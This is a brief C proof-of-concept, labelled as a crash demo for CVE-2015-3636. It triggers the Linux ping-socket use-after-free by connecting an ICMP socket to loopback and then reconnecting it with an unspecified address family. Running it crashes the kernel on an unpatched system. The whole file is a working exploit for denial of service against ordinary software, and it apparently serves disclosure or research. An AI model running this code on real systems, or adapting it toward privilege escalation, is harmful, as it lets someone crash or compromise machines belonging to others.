/*
    Create By Edward Hung 2015 07 20
    CVE-2015-3636 Crash Demo
*/


#include <stdio.h>

#include <sys/socket.h>

#include <arpa/inet.h>


int main(int argc, char **argv)
{
    int sockfd = 0;
    struct sockaddr_in addr = {0};
    int ret = 0;


    printf("main=%x\n", (unsigned)main);

    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    if (sockfd == -1)
    {
        perror("socket");
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = 0;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    connect(sockfd, (struct sockaddr *)&addr, 16);

    addr.sin_family = 0;
    connect(sockfd, (struct sockaddr *)&addr, 16);

    return 0;
}
